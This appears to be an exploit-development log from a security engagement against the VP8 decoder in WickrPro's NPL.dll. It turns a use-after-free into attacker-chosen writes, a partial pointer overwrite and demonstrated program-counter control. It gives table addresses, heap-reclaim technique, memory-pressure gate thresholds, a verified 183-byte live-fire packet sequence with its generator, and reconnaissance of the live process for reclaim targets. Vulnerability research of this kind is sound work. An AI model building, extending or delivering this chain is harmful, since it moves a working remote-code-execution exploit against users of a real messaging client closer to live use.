# W5 CRUX — F4-2 IS content-controlled. Wave 4's "steerability unproven" is OVERTURNED.

Date 2026-07-31. All results below were produced by the lead in this session against the
**unmodified installed `NPL.dll`**, no patched binary, no debugger, no allocator hooks.
CONFIRMED = I measured it or read the bytes. INFERRED = reasoned from confirmed facts.

Tools written this session, all in `scratch/w4/fuzz-vp8/`:
`findtables.py`, `vp8modes.py`, `steer.py`, `steer2.py`, `uaf_steer.py`.
Evidence logs: `W5-uaf-steer-evidence.log`, `W5-control.log`.

---

## 0. The headline

> **A call peer can choose the bytes that F4-2's use-after-free writes.**
> Measured 4/4 on every trial that reached the experiment, into a block the allocator had
> already handed to a different owner.

Wave 4 recorded *"Observed UAF write content was 9 zero bytes per MODE_INFO in every trial
including randomised inter-frame payloads, so content steerability is unproven"*, and the
RCE assessment then listed **content control** as one of the two missing ingredients for
RCE. That entry is now wrong and must be struck.

## 1. Why Wave 4 got zeros — the methodological error, stated plainly

Wave 4's frame C was `assemble(0, 0, build_part0(...) + b"\x00"*32, [b"\x00"*64], ...)`.

Macroblock modes and motion vectors are **arithmetic-coded** in VP8 partition 0. An
arbitrary byte string therefore cannot *select* a mode — it decodes to whichever leaf the
probability tree makes cheapest, and for an all-zero stream that is the intra / zero-MV
corner. So the experiment could only ever have produced zeros, under **both** hypotheses:
"content is steerable" and "content is not steerable" predict the identical observation.

This is the same failure the brief's §0 rule 4 already names — *"a benign capture cannot
refute a peer-controlled-field claim… before you measure, ask what observation would
distinguish the hypotheses"*. Here the distinguishing observation requires an **encoded**
mode section, which nobody had built. **Rule 4 now has a second worked example.**

## 2. What was built

`vp8modes.py` encodes the whole partition-0 tail in the order
`decodeframe.c` / `decodemv.c` read it:

1. the 1056-entry coefficient-probability update loop (all "no update"),
2. `mb_no_coeff_skip`,
3. `mb_mode_mv_init` — `prob_skip_false`, `prob_intra`, `prob_last`, `prob_gf`, the ymode
   and uv_mode probability updates, and `read_mvcontexts` (2 × 19 gated updates),
4. per-macroblock `read_mb_modes` / `read_kf_modes`.

**Every probability came out of the shipped DLL, not out of upstream headers** — one wrong
byte desyncs the arithmetic decoder, and the completeness critic established this libvpx is
not stock 1.9.0. `findtables.py` located each table with a **unique** hit in the 5.7 MB
image (CONFIRMED):

| table | RVA | VA |
|---|---|---|
| `vp8_coef_update_probs` (1056 B) | `0x466a20` | `0x180466a20` |
| `vp8_mv_update_probs` (2×19) | `0x4684d0` | `0x1804684d0` |
| `vp8_default_mv_context` (2×19) | `0x4684f8` | `0x1804684f8` |
| `vp8_mode_contexts` (int[6][4]) | `0x46e640` | `0x18046e640` |
| `vp8_kf_ymode_prob` / `vp8_ymode_prob` | `0x466598` / `0x46659c` | — |
| `vp8_kf_uv_mode_prob` / `vp8_uv_mode_prob` | `0x466594` / `0x4665a0` | — |

All six match the stock values, so **for these tables** the build is stock.

## 3. Step 1 — steerability in a HEALTHY decoder (no UAF involved). CONFIRMED.

`steer.py`: decode a 64×64 keyframe, then a crafted inter frame in which macroblock (0,0)
is coded NEWMV with a chosen vector, and read `pc->mi` back out of the process.

```
[A] 64x64 keyframe            -> rc=0 (VPX_CODEC_OK)
[B] crafted inter frame (95 B) -> rc=0 (VPX_CODEC_OK)
    asked for  mv.row=582 (0x0246)  mv.col=1128 (0x0468)   bytes = 46026804
    MODE_INFO[0] mode=  8 uv=  0 ref=  1 is4x4=0 mv=46026804  part=0 skip=1 clamp=1 seg=0
[CONFIRMED] MODE_INFO[0].mv = 46026804 == requested 46026804
```

`steer2.py` scaled it: a 256×256 first frame, **64 steered macroblocks each carrying a
DIFFERENT vector**, verified byte-for-byte:

```
[*] verified 64/64 steered macroblocks carry the exact requested mv
    (and mode=NEWMV, ref=LAST); 0 mismatched
```

### 3a. Placement rule that makes this predictable without simulating `vp8_find_near_mvs`

A NEWMV macroblock whose **above / left / above-left** neighbours are all intra sees
`cnt = (0,0,0,0)` and `best_mv = 0`, so `mv->as_mv.row += best_mv.as_mv.row` is a no-op and
the decoded vector is stored **verbatim**. Coding NEWMV only at `(row % 2 == 0 and
col % 2 == 0)` guarantees that for every one of them. No clamp is applied to the stored
value — `vp8_check_mv_bounds` only sets the `need_to_clamp_mvs` flag.

### 3b. The alphabet — the real limit on this primitive, stated exactly. CONFIRMED.

`read_mv` stores `(short)(read_mvcomponent(...) * 2)` and the component magnitude is
bounded by `mvlong_width = 10` bits. So each of `row`/`col` is an int16 that is **even** and
in **[−2046, +2046]**. Measured alphabet over the 64-macroblock run:

```
low  byte : 88 distinct values, ALL EVEN          (0x00..0xFE, even)
high byte : 0,1,2,3,4,5,6,7, 248,249,250,251,252,253,254,255   (0x00..0x07 or 0xF8..0xFF)
```

⇒ **4 chosen bytes per MODE_INFO at offset +4**, at a 76-byte stride (152 with the
every-other-macroblock placement). Not arbitrary bytes — but see §6.

## 4. Step 2 — steerability THROUGH THE DANGLING POINTER. CONFIRMED, with a control.

`uaf_steer.py`: 64×64 keyframe → 16383×16383 keyframe (allocation fails under a Job Object
commit cap) → `vp8_de_alloc_frame_buffers` frees `mip` and NULLs it while `mi` keeps
pointing into the freed block → **reclaim the freed block** → fire the crafted inter frame.

**Reclaim correction, and it matters.** `uaf_reclaim.py` reclaimed with
`ctypes.create_string_buffer`. That never lands: Python serves those sizes from its own
arenas, not the process heap. Measured here — 8192 attempts, zero hits. Switching to
`HeapAlloc(GetProcessHeap(), …)` reclaims **on attempt #0** in most runs, because that is
the heap `vpx_memalign → malloc` actually reaches. It is also the faithful model: it is the
heap every other subsystem in the process allocates from, so this is a genuine cross-owner
reclaim rather than a private-arena artefact.

### The two runs, same machinery, same UAF, same reclaim

**CONTROL — Wave 4's unencoded frame C** (`W5-control.log`):
```
[C] CONTROL: Wave 4 style all-zero inter frame (mode section not encoded)
[*] bytes changed INSIDE the reclaimed block: 0 of 1923
    mb(0,0) block+  472: want 46026804  got 00000000  MISS   (x4)
[NOT DEMONSTRATED] 0/4
```

**CRAFTED — encoded mode/MV section** (`W5-uaf-steer-evidence.log`):
```
[*] reclaimed on HeapAlloc attempt #0
[*] RECLAIMED: a fresh 1923-byte allocation owned by THIS SCRIPT covers 0xeca8100830;
    pc->mi sits 472 bytes into it. Zero-filled.
[*] bytes changed INSIDE the reclaimed block: 43 of 1923  (offsets 472..1849)
    mb(0,0) block+  472: want 46026804  got 46026804  OK
    mb(0,2) block+  624: want bafd3401  got bafd3401  OK
    mb(2,0) block+ 1232: want fe0702f8  got fe0702f8  OK
    mb(2,2) block+ 1384: want 00fffefd  got 00fffefd  OK
[CONFIRMED] 4/4 attacker-chosen motion vectors written through the dangling pc->mi
```

**4/4 on every trial that reached the experiment (4 separate runs).** Two further runs
aborted earlier in the VP8_COMMON memory scan and are recorded as **no data**, not as
negatives — same discipline as Wave 4's `allocgate` liveness counter.

### 4a. A correction to my own first reading of these runs

The tool also prints "bytes changed PAST the block end". **That number is not evidence**:
it compares against a fill that was only ever applied inside the block, so it counts
pre-existing bytes as changes. The control shows 76 such "changes" while writing nothing.
The overrun past the block is established by **arithmetic** instead, and that is sound:
`mi` sits 472 B into a 1923 B block and the MODE_INFO array is
`mb_rows × stride × 76 = 4 × 5 × 76 = 1520` B, so the write ends at 1992 — **69 bytes past
the end of the freed block**, in addition to corrupting all of it.

### 4b. NEW exploitation constraint nobody had — the reclaimed bytes FEED BACK. CONFIRMED.

The first attempt filled the reclaimed block with `0xAA` and got `80ff80ff`, `82fe7cff`
instead of the requested vectors. That is not a failure of steering; it is a real property
of the primitive:

> the decoder **reads the reclaimed block back** as neighbouring MODE_INFOs while decoding.
> `mbmi.ref_frame != INTRA_FRAME` makes a neighbour count toward `cnt[]`, which changes the
> `vp8_mv_ref` probabilities, which changes which **mode** the tree decodes, and
> `best_mv` becomes a clamped neighbour vector that is added to the stored MV.
> `0x80ff = −128` is exactly `mb_to_left_edge − LEFT_TOP_MARGIN` for macroblock column 0.

**⇒ An attacker aiming this must model the reclaiming object's contents at the MODE_INFO
field offsets it will be re-read at (`+0` mode, `+2` ref_frame, `+4` mv).** With a
zero-initialised reclaimer the prediction is exact (4/4 above). With a non-zero one the
values still land but must be predicted through the feedback. This is an exploitation
*constraint*, not a barrier — and it was completely unknown before this session.

## 5. Impact on the RCE assessment

`W4-CRUX-rce-path-assessment.md` §"Conclusion on RCE" lists a table of ingredients. One row
changes:

| ingredient | was | now |
|---|---|---|
| attacker-controlled **content** | **NO** | **YES — F4-2, measured 4/4** (this file) |
| information leak / layout knowledge | NO | NO — unchanged |

Note the two missing ingredients were listed as *independent*. The content-control leg was
about F4-2, and it is now supplied. What remains missing for RCE is **(a) the allocation
failure gate** and **(b) layout knowledge / a leak**.

## 6. What the primitive now is, honestly

**CONFIRMED:** a peer that gets the gate open can write, through a dangling pointer into a
freed block now owned by someone else, a **chosen** 4-byte value every 76 bytes across an
array whose length and starting offset it also chooses (via the first frame's resolution),
running past the end of the freed block.

**Constraints, all measured:** the 4 bytes are two even int16s in ±2046, i.e. low byte even
and high byte in `0x00..0x07 ∪ 0xF8..0xFF`; the surrounding MODE_INFO bytes (`mode`,
`ref_frame`, `partitioning`, `segment_id`, …) are small enums; and the reclaimed contents
feed back into decoding (§4b).

**NOT established, and NOT claimed:**
* That this reaches PC control. A full pointer cannot be written directly — `0x00007FF8`
  as a high half needs `row = 0x7FF8 = −2056`, outside the ±2046 range. A **partial**
  pointer overwrite is within the alphabet and is the obvious route (this engagement
  already demonstrated the ASLR-surviving partial-overwrite technique in `pcdemo_partial`),
  but it has not been attempted against F4-2.
* **SPLITMV was not tested.** `read_mb_modes`' SPLITMV arm fills `bmi[16]` — 64 contiguous
  bytes at MODE_INFO+12 — with 16 independently chosen sub-vectors, which would raise the
  density from 4 bytes per 76 to 68. `vp8_sub_mv_ref_prob` and `vp8_mbsplit_probs` were
  already extracted (§2) but the arm is unencoded. **This is the cheapest next step.**
* The gate. See §7.

## 6b. SPLITMV — density raised from 4 bytes per 76 to 68. CONFIRMED.

Implemented after the above and measured (`steer3.py`, 128×128, healthy decoder):

```
[B] SPLITMV inter frame, 1233 bytes, 16 macroblocks -> rc=0 (VPX_CODEC_OK)
[*] 16/16 macroblocks carry all 16 requested sub-vectors (mode=SPLITMV, partitioning=3)
[*] chosen bytes placed: 16 x 64 = 1024 contiguous bytes at MODE_INFO+12, vs 64 with NEWMV
```

`read_mb_modes`' SPLITMV arm with `partitioning = 3` fills `bmi[16]` — sixteen independent
4×4 vectors, **64 contiguous chosen bytes at MODE_INFO+12**. The four tables it needs were
also located uniquely and stock in the shipped DLL, adjacent as libvpx emits them:
`vp8_mbsplit_probs` RVA `0x466030`, `vp8_sub_mv_ref_prob2` `0x466038`,
`vp8_mbsplit_tree` `0x466078`, `vp8_sub_mv_ref_tree` `0x466088`.

The per-block `sub_mv_ref` context chain (`left_block_mv` / `above_block_mv` →
`vp8_mv_cont`) is computed in the encoder from the entries it has already emitted, so no
simulation of neighbouring macroblocks is needed for isolated placement.

## 6c. Offset control — which byte residues can be hit

Measured: `mi` sits at `raw_block + 16 + (stride+1)*76` (the 16 is `vpx_memalign`'s
offset; the 472 observed for W=64 is `16 + 6*76`). The attacker chooses `stride` via the
**first** frame's width, and the freed block's size class via its width *and* height. Within
a record the writable slots are `mv` at +4 (4 B), `bmi[k]` at +12+4k (4 B each), and the
single-byte enum fields at +0,+1,+2,+3,+8,+9,+10,+11.

⇒ modulo 76 the reachable byte residues are `{0..15} ∪ {20..23} ∪ {28..75}` = **68 of 76**;
only residues 16–19 and 24–27 are unreachable. Combined with free choice of the block size
class, essentially any offset in a reclaimed object can be targeted.

## 6d. What the alphabet permits against a POINTER — the part that still blocks RCE

This is the constraint that decides whether F4-2 reaches PC control, so it is stated
exactly rather than waved at.

* `int_mv` is written **4 bytes at a time**. There is no 2-byte write. So the classic
  "keep the module, change the low 16 bits" partial overwrite is **not available**: writing
  the low 4 bytes of a pointer also rewrites bits 16–31, and those must satisfy
  `≤ 0x07FE` or `≥ 0xF802` — which moves a code pointer by up to ~4 GB, out of its module.
* The single-byte fields carry only small enums (`mode` 0–9, `ref_frame` 0–3,
  `segment_id` 0–3, …), so a **1-byte** partial overwrite can set one byte of a pointer to
  a value in 0..9. That relocates a pointer within a 256-byte window — a type-confusion
  primitive, not a code-pointer hijack.
* A **full 8-byte pointer** can be written, but only to an address whose bytes 0,2,4,6 are
  even and whose bytes 1,3,5,7 lie in `0x00..0x07 ∪ 0xF8..0xFF`. Roughly 2^-20 of
  addresses qualify. A user-mode heap address like `0x000001d4_79042050` does **not**
  (byte 3 = 0x79).

**⇒ To reach PC control the attacker must know an alphabet-compatible address holding data
it controls. That is an information-disclosure requirement.** So the blocker that
`W4-CRUX-rce-path-assessment.md` identified for route A — *there is no info-leak path back
to the attacker* — **is the same blocker for route B.** The two routes do not fail for
independent reasons; they fail for one reason. That unification is new and is the single
most useful thing to carry forward.

### 6e. PARTIAL pointer overwrite — ATTEMPTED, and it WORKS. CONFIRMED.

I wrote the paragraph above ("not attempted… the most promising remaining idea") and then
tested it. `uaf_partial.py` plants a realistic 8-byte pointer in the reclaimed block and
fires the UAF at it:

```
    planted pointer  : 3412debcfa7f0000   (= 0x00007ffabcde1234)
    after the UAF    : 68044602fa7f0000   (= 0x00007ffa02460468)
    requested low 4  : 68044602
    low  half rewritten to the requested value : YES
    high half (ASLR entropy) preserved         : YES
[CONFIRMED] partial pointer overwrite via F4-2: low 32 bits redirected, high 32 bits intact
```

**⇒ §6d's conclusion that PC control needs an information leak is WRONG and is retracted.**
A partial overwrite needs no leak: the ASLR entropy lives in the high half and is preserved.

Getting there took two non-obvious steps, both worth recording because they are what an
exploit would have to do:

1. **The chosen bytes are normally FLANKED by other written bytes.** First attempt put the
   pointer's low half on the NEWMV `mv` field (+4). Its high half then landed on +8..+11 and
   `mb_skip_coeff` / `need_to_clamp_mvs` were written over it — measured, the high half went
   `00007ffa → 000101fa`. A NEWMV record writes all of `mbmi` (+0..+11); a SPLITMV record
   writes all 76 bytes. So almost nowhere in the array is a 4-byte chosen value adjacent to
   memory the decoder leaves alone.
2. **There is exactly one exception: the tail of the LAST record.** The write ends at
   `block_size − 7` — arithmetic: `mi_off + array = 16 + 76·stride·(mb_rows+1) = block − 7`.
   So the last record's `bmi[15]` occupies `[block−11, block−7)` and the 7 bytes after it
   are never touched. Placing the pointer at `block−11` gives low half = `bmi[15]` = chosen,
   high half = the block's tail slack = preserved.

Two geometry conditions follow, and the attacker controls both:
* `block − 11` must be 8-aligned for a real object's pointer ⇒ `mb_cols` and `mb_rows` both
  **even** (W = H = 64 gives block 1923, pointer at 1912).
* the last macroblock `(mb_rows−1, mb_cols−1)` must itself be steered *and* isolated ⇒ the
  placement rule flips from "row and col both even" to "both **odd**".

**Residual constraint, stated honestly.** The new low32 must still be alphabet-compatible
(bytes 0,2 even; bytes 1,3 in `0x00..0x07 ∪ 0xF8..0xFF`), so the redirect lands in the
**low 128 MiB or the high 128 MiB of the pointer's own 4 GiB window**. The attacker
therefore still needs controlled data at a predictable *low-32* offset in that window — a
far weaker requirement than an address leak, but not nothing. Note the attacker can commit
~2 GiB per decoder context (F4-3), so spraying that window is plausible; **this has not been
tested and is the next step.**

Note also that only **one** slot per armed context yields a clean partial overwrite. The
attacker chooses *where* it lands (via the block size class and geometry), but not how many.

### 6f. Pricing that residual — the spray DOES reach the band. MEASURED, 3 runs.

After a 16383×16383 keyframe the decoder holds four ~387 MiB YV12 buffers plus context
arrays, and they are allocated **contiguously inside a single 4 GiB window** (all share one
high 32 bits). Measured region maps, three independent runs:

```
run 1  base 0x00024d00001000  low32 = 0x00001000   <- in the low band
run 2  base 0x00027af0820000  low32 = 0xf0820000   <- in the high band
run 3  base 0x00019900009000  low32 = 0x00009000   <- in the low band
```

In **3 of 3 runs exactly one of the ~6 large regions intersects the reachable 128 MiB band
of its own 4 GiB window** — and in two runs it was the *first* region, sitting essentially
at the window base (`low32 = 0x1000` / `0x9000`).

⇒ the residual in §6e is **not prohibitive**: a peer that drives F4-3 has attacker-influenced
pixel data inside the reachable band roughly once per spray. **What is still unproven is the
join:** whether any pointer in a *reclaiming* object points into that same 4 GiB window, which
is a property of the live process and cannot be settled in this harness.

## 7. The gate, re-priced — now MEASURED, not inferred

Wave 4 measured the maximum retained decoder allocation at **1.95 GiB per context** and
CONFIRMED by disassembly that there are **exactly two contexts per publisher**, selected by
**bit 14 of `Frame+0x90`**, which is peer metadata off the wire. It then concluded "~5
publishers needed against 19.03 GiB of headroom on this host".

That framing understates it, because **the peer supplies its own memory pressure**: it can
park 1.95 GiB in context 0 and *then* target context 1. So the requirement is not "a 4 GiB
machine" but:

> **one peer arms F4-2 on any victim whose FREE COMMIT is below ~4.0 GiB.**

**MEASURED** with `gate2ctx.py`, which runs the exact single-peer sequence against two
independent decoder contexts under a Job Object cap modelling the victim's free commit:

| modelled free commit | ctx0 `16383×16383` | ctx1 `16383×16383` | gate |
|---|---|---|---|
| 5000 MiB | rc=0, **+2017.0 MiB** | rc=0, +2017.0 MiB | closed |
| 4200 MiB | rc=0, +2017.0 MiB | rc=0, +2017.0 MiB | closed |
| 4100 MiB | rc=0, +2017.0 MiB | rc=0, +2017.0 MiB | closed |
| **4000 MiB** | rc=0, +2017.0 MiB | **rc=−1, +0.0 MiB** | **ARMED** |
| 3900 MiB | rc=0, +2017.0 MiB | **rc=−1** | **ARMED** |
| 3000 MiB | rc=0, +2017.0 MiB | **rc=−1** | **ARMED** |

The threshold sits between 4000 and 4100 MiB, exactly where the arithmetic puts it:
**2 × 2017 = 4034 MiB**. At 4000 MiB the dangling state was verified present —
`VP8_COMMON` with `mip == 0` and `mi = 0x183787c70e8`.

Free commit, not installed RAM — the Wave 4 host had a 27.88 GiB commit limit and 8.85 GiB
already committed at rest. An 8 GiB laptop with a modest pagefile and a browser open sits
well inside that window. **This widens the affected population a long way beyond "small-RAM
hosts", and the "~5 malicious publishers" figure should be struck wherever it appears.**

**Qualifier, carried deliberately.** What is measured is the *allocator* behaviour: two
decoder contexts, real `NPL.dll`, real NT heap, no hooks. That one peer can address both
contexts over the wire is CONFIRMED by Wave 4's disassembly (`0x180144685`..`0x180144777`
creates exactly two; the selector is bit 14 of `Frame+0x90`, peer metadata), but the
sequence has **not** been driven end-to-end through NPL's frame path on a live call. Until
it is, the honest label for the end-to-end gate is CONFIRMED-in-parts.

---

## Appendix A — route A's content control is structurally dead, and here is the general reason

Disassembled by the lead this session from the shipped `WickrPro.exe`, function extent
`0x13f390..0x13f4e1`. Two facts the earlier notes quoted but did not join up:

```
0x14013f3d5  lea  r8,  [rsp+0x38]          ; &ptr   -- NPLAVPacketGetBuffer out-params
0x14013f3d0  lea  r9,  [rsp+0x30]          ; &n
0x14013f3f7  mov  rdx, [rsp+0x38]          ; READ  src  = ptr
0x14013f401  call QByteArray(const char*, qsizetype)     ; deep-copies n bytes
...
0x14013f461  jle  0x14013f48e              ; empty plaintext -> the memset arm
0x14013f482  mov  rcx, [rsp+0x38]          ; WRITE dst  = ptr      <-- the SAME slot
0x14013f487  call memcpy
0x14013f48c  jmp  0x14013f49f              ; <-- the arms ARE exclusive (this was omitted
0x14013f48e  mov  r8d, [rsp+0x30]          ;      from the earlier transcription)
0x14013f49a  call memset
```

So the over-read source and the write destination are the **same pointer**, and the AEAD
framing is `algo(1) || IV(12) || TAG(16) || ciphertext` (29 bytes of overhead, settled in
`W4-CRUX-aead-settled.md`).

**The general result.** Let `B` be the space from `ptr` to the end of its allocation and
`n` the peer-declared length. The ciphertext GCM authenticates is bytes `[29, n)`; the
plaintext written back is `n − 29` bytes at `ptr`. Therefore:

> to overflow by `K` bytes the attacker must **know** `K + 29` bytes it does not own,
> while it can only **write** `K`.

The known region can never exceed the allocation without an information leak, so
`n ≤ B` always, so `n − 29 < B` always. **No amount of heap grooming, packet-pool
recycling, protobuf-string capacity reuse or block adjacency changes this** — each of those
only extends what the attacker *knows*, and the deficit is defined relative to exactly that.

This is strictly stronger than the existing argument ("inflation fails auth by construction
because the tag sits inside the payload the attacker really sent"), which reads as a
property of one framing choice. The deficit is a property of *any* AEAD whose overhead is
carried inside the same buffer that is written back in place.

**⇒ Route A can never have content control without an info leak; route B has content
control but cannot place a pointer without an info leak. One missing ingredient, not two.**

---

## 8. PC CONTROL from F4-2 — demonstrated. `uaf_pc.py`, `W5-pc-control-evidence.log`.

The chain runs end to end inside the harness, against the unmodified installed `NPL.dll`:

```
[*] sprayed region 0x0000030001000000..0x0000030003000000
    A (attacker vtable) = 0x0000030001000000  low32=0x01000000  alphabet-compatible
    B (legit vtable)    = 0x0000030002000000  low32=0x02000000  same 4 GiB window
[*] armed and reclaimed the EXACT freed block on attempt 0
[*] planted an object pointer -> B at block+1912
[C] firing one inter frame (108 B): bmi[15] of (3,3) -> low32 0x01000000
[*] object pointer was B=0x0000030002000000, now 0x0000030001000000
    redirected to A exactly; high 32 bits 0x300 preserved, low 32 set to 0x01000000
[*] loading the vtable from the redirected object -> slot0 = 0x000002689ebc0fc0
[*] called slot 0 -> returned 0xc0de  (attacker function ran: YES)
[CONFIRMED] PC control from F4-2
```

**QUALIFIER, and it travels with the result.** The decode calls are argument-identical to the
live path — public wrapper, real frames, unmodified installed DLL, real NT heap, no hooks,
no debugger. **The reclaiming object is supplied by this harness.** So what is demonstrated
is *the F4-2 primitive is sufficient for PC control given a reclaiming object that holds a
pointer at a reachable offset* — **exploitability-if-reachable**, in the brief's §5 sense.
It does **not** show that such an object reclaims the block in the live WickrPro process.

### 8a. One clean partial-overwrite slot PER ROW, not one per frame. CONFIRMED.

Correcting §6e, which said there is exactly one. `vp8_decode_mode_mvs` does an **extra
`mi++` at the end of every row** to skip the left predictor, so the record immediately after
the last macroblock of *each* row is never written. That makes the last macroblock's
`bmi[15]` a clean slot on every row. Verified at W=64 for **row 1 (block+1152) and row 3
(block+1912)**, both CONFIRMED with the high half intact. The array-end slot is simply the
last row's.

⇒ the attacker gets `mb_rows/2` clean slots (odd rows under the isolation rule) at offsets
`mi_off + (r·stride + mb_cols−1)·76 + 72`, *plus* free choice of the block size class. Aim
is far more flexible than §6e implied.

### 8b. Reclaim discipline — require the EXACT block

A same-size block that merely *contains* `mi` is not good enough: it shifts every offset and
breaks the placement arithmetic (measured — `mi − base` came out 1352 instead of the
predicted 472). `vpx_memalign` offsets its result 16 bytes into the raw allocation, so the
freed block's base is `mip − 16`; require that exactly. Getting it is racy, so re-arm
in-process (a small keyframe re-allocates `mip`) and `HeapFree` the probe blocks between
attempts — attempt 0 succeeds most runs that way.

## 9. Where the chain stands

| link | status |
|---|---|
| gate: one peer arms it | **MEASURED** — victim free commit below ~4034 MiB (§7) |
| content control through the dangling pointer | **MEASURED** — 4/4 (§4) |
| write density | **MEASURED** — 68 chosen bytes per 76-byte record (§6b) |
| aim: offset + size class | **MEASURED** — 68/76 residues, one clean slot per row (§6c, §8a) |
| ASLR-surviving partial pointer overwrite | **MEASURED** (§6e) |
| PC control from the primitive | **MEASURED, harness-supplied reclaimer** (§8) |
| a real reclaiming object in live WickrPro | **OPEN** |
| live over-the-wire delivery | **OPEN** |

**RCE is NOT demonstrated and must not be claimed.** Two links are open, both requiring the
live environment. What *has* changed is that the exploit-primitive questions are closed:
what remains is target selection and live fire, not research into whether the primitive is
strong enough.

## 10. Live-fire payload set — built and verified offline

`scratch/w4/fuzz-vp8/gen_e2e_payload.py` emits `e2e-payload/` and refuses to write anything
it has not first decoded through the installed `NPL.dll`:

```
[verify] small keyframe   41 B -> rc=0 (VPX_CODEC_OK)
[verify] SPLITMV inter   108 B -> rc=0 (VPX_CODEC_OK)
[verify] huge keyframe    34 B -> rc=0, parked +2017.0 MiB of commit
```

The whole single-publisher sequence is **183 bytes of VP8** across five packets:

| ctx | frame | bytes | role |
|---|---|---|---|
| 0 | `A_small_keyframe.vp8` | 41 | establish context 0 |
| 0 | `B_huge_keyframe.vp8` | 34 | parks ~2017 MiB — must SUCCEED |
| 1 | `A_small_keyframe.vp8` | 41 | allocates the `mip` block that will dangle |
| 1 | `B_huge_keyframe.vp8` | 34 | must FAIL ⇒ `pc->mi` dangles |
| 1 | `C_splitmv_inter.vp8` | 108 | writes chosen bytes through the dangling `pc->mi` |

Context selection is **bit 14 of `Frame+0x90`** — peer metadata *outside* the VP8 bitstream,
so the sender sets it per packet; it is recorded in the manifest rather than encoded in the
blobs. Clean partial-overwrite slots for this geometry: **block+1152 (row 1)** and
**block+1912 (row 3)**, freed block 1923 bytes, `mi` at +472.

**Retargeting note that matters:** the redirect value is arithmetic-coded, so it does **not**
appear literally in `C_splitmv_inter.vp8` and the file cannot be byte-patched. Change
`TARGET_LOW32` and re-run the generator. (My first version of the manifest tried to report a
byte offset for it and printed `-1`; that field is removed.)

**What this does NOT do:** it does not deliver the frames. Delivery still needs the sender-side
injector (build on `scratch/w3/lead/rawpub2_inject.c`) and a live call.

## 11. Live-process reconnaissance — what it settled, and what it did not

WickrPro was launched on this host purely to characterise the process (read-only, no
injection, no writes, no debugger) and was closed again afterwards. No call was placed.

**11a. WickrPro uses the CLASSIC NT HEAP, one process heap. CONFIRMED.**
`PEB->ProcessHeap = 0xf5329d0000`, `NumberOfHeaps = 1`, and the block at that address has
`EE FF EE FF` at +0x10 = `_HEAP_SEGMENT.SegmentSignature` **0xFFEEFFEE**, not the Segment
Heap's `0xDDEEDDEE`. (My first reading called this "unknown" because I compared against
`_HEAP.Signature` 0xEEFFEEFF, which is a different field — corrected here.)

Two consequences, both good for the finding: the harness reclaim model
(`HeapAlloc(GetProcessHeap())`) is **faithful in kind**, and libvpx's `mip` block shares a
single heap with every other subsystem, so a cross-owner reclaim is structurally available.

**11b. A polymorphic object's vtable can NEVER be the target. CONFIRMED by arithmetic.**
The write never touches the first `mi_off = 16 + (stride+1)*76` bytes of the block, and the
minimum over all legal geometries (`mb_cols >= 1`) is **244**. A C++ object keeps its vtable
pointer at offset 0. ⇒ **the reclaiming allocation must be ARRAY-LIKE** — a pointer array,
vector buffer or queue backing store where pointers recur throughout the block — or a large
struct carrying a code pointer deep inside it. That is a sharp narrowing of the live search
and it was free.

**11c. A 4 GiB-window constraint that narrows it further.** A partial overwrite keeps the
pointer in **its own** 4 GiB window. Measured: WickrPro's process heap is in window `0xf5`
with low32 `0x329d0000` — outside the reachable band — while the decoder's ~2 GiB spray gets
an independent ASLR draw (`0x24d`, `0x27a`, `0x199` across three runs). So a pointer into the
*generic process heap* cannot be redirected into the attacker's spray.

> **⇒ the usefully attackable pointer is one that already points into memory the attacker can
> spray — i.e. into the decoder's own frame buffers — not an arbitrary heap pointer.**

Combined with 11b, the live search is now specific rather than open-ended: **an array-like
allocation, in an attacker-reproducible size class, holding pointers into decoder/media
buffers.** `Musigy::NPL::Net::XorFecDecoder`'s queue of retained packets (Wave 4 established
it is structurally adjacent to media packets, and its depth — hence its backing array's size
class — is peer-driven) is the first candidate to check.

**11d. What the recon did NOT settle.** ToolHelp heap enumeration returned
`ERROR_NO_MORE_FILES`, so no block-level inventory was obtained; and the idle process does
not contain the media-path objects that matter anyway. **Enumerating candidates requires a
live call.** An earlier scan (`ptrarray_scan.py`) reported "0.9% of pointer runs fall in an
attacker-reachable size class" — **that number is wrong and must not be quoted**: it compared
a pointer *run's* length against the attacker's block size, but what has to match the size
class is the *allocation*, and that scan could not see allocation boundaries.

## 12. The media packet is RULED OUT as a reclaim target. CONFIRMED by disassembly.

The obvious target-selection candidate was the media packet itself: the pool `0x1800e0490`
allocates `[0x120 header][headroom][payload]` as ONE block **whose size is the number of
bytes the peer sent**, and the FEC decoder **retains** it — an allocation whose size class
*and* lifetime the attacker controls, which is exactly what a reclaim target must be.

Full header map, read from the constructor `0x1800e0490` and the two re-init paths:

```
+0x00  data pointer (-> base+0x160, into itself)   POINTER, offset   0  -- below the 244 floor
+0x08  size            +0x0c w   +0x10 q=0   +0x18 b  +0x1a d  +0x1e b  +0x20 d
+0x24  xmm=0           +0x34 d=0
+0x38..+0xb7  zeroed by eight movups stores
+0xb8  d=0   +0xbc b=0   +0xc0 b=0   +0xc4 q=0
+0xcc  refcount = 1
+0xd0  pool pointer                                POINTER, offset 208  -- below the floor by 36
+0xd8  headroom
+0xe0 q=0   +0xe8 q=0   +0xf0 q=0                  offsets 224/232/240  -- all just below 244
+0xf8  b=0   +0xfc d=0   +0x100 b=0
+0x108 q=0                                         offset 264  -- REACHABLE
+0x110 d=0
+0x118 q=0                                         offset 280  -- REACHABLE
```

Only `+0x108` and `+0x118` are qwords above the 244-byte floor, so they were the whole
question. `pktfield_scan.py` disassembled **every** `.pdata` function in NPL.dll looking for
`mov qword [reg+0x108|0x118], reg`. Every hit inside the packet cluster is an **initialiser
storing ZERO**:

| site | store | source register |
|---|---|---|
| `0x1800e0539` / `0x1800e0546` | ctor `0x1800e0490` | `rcx` = 0 |
| `0x1800e07d9` / `0x1800e07e6` | re-init `0x1800e0714` | `rdx` = 0 (same reg used for the `dl`/`edx` zero stores) |
| `0x1800e0e42` / `0x1800e0e52` | re-init `0x1800e0ce0` | `r14` = 0 |

`0x1800e7880` is a different class, not a packet: its refcount is at `+0x08`
(`lock inc dword [rbx+8]`) and `+0xd8`/`+0xf8` are two MSVC `std::string`s in SSO mode
(`cap = 0xf` at `+0xf0` and `+0x110`).

> **⇒ A media packet holds no pointer at any offset the F4-2 write can reach. It is not a
> viable reclaim target.** The two pointers it does carry, `+0x00` and `+0xd0`, sit 244 and
> 36 bytes below the floor respectively.

**Residual on this negative, stated honestly:** the scan matched only
`mov qword [reg+disp], reg`. A pointer deposited by `movups` of a register pair, by `xchg`,
or through an interior base pointer with a different displacement would not have been
caught. The three init paths are conclusive about the *initial* state; the negative for the
*steady* state is strong but not exhaustive.

